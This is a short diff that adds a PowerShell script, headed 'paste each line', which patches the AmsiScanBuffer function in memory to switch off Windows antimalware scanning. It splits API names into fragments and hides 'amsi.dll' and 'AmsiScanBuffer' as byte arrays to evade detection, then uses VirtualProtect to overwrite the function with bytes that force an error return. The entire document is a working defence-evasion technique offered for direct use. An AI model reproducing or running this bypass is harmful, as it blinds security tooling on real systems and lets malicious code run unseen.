@@ -1,0 +1,22 @@
+paste each line
+
+$thing = "using System;`n"
+$thing = $thing + "using System.Runt" + "ime.InteropServices;`n"
+$thing = $thing + "public class thing {`n"
+$thing = $thing + "[DllImport(`"kernel32`")]`n"
+$thing = $thing + "public static extern IntPtr GetPro" + "cAddress(IntPtr hModule, string procName);`n"
+$thing = $thing + "[DllImport(`"kernel32`")]`n"
+$thing = $thing + "public static extern IntPtr Load" + "Library(string name);`n"
+$thing = $thing + "[DllImport(`"kernel32`")]`n"
+$thing = $thing + "public static extern bool Virtual" + "Protect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);`n"
+$thing = $thing + "}`n"
+
+Add-Type $thing
+$test = [Byte[]](0x61, 0x6d, 0x73, 0x69, 0x2e, 0x64, 0x6c, 0x6c)
+$Load = [thing]::LoadLibrary([System.Text.Encoding]::ASCII.GetString($test))
+$test2 = [Byte[]] (0x41, 0x6d, 0x73, 0x69, 0x53, 0x63, 0x61, 0x6e, 0x42, 0x75, 0x66, 0x66, 0x65, 0x72)
+$Address = [thing]::GetProcAddress($Load, [System.Text.Encoding]::ASCII.GetString($test2))
+$p = 0
+[thing]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)
+$Patch = [Byte[]] (0x31, 0xC0, 0x05, 0x78, 0x01, 0x19, 0x7F, 0x05, 0xDF, 0xFE, 0xED, 0x00, 0xC3)
+[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, $Patch.Length)
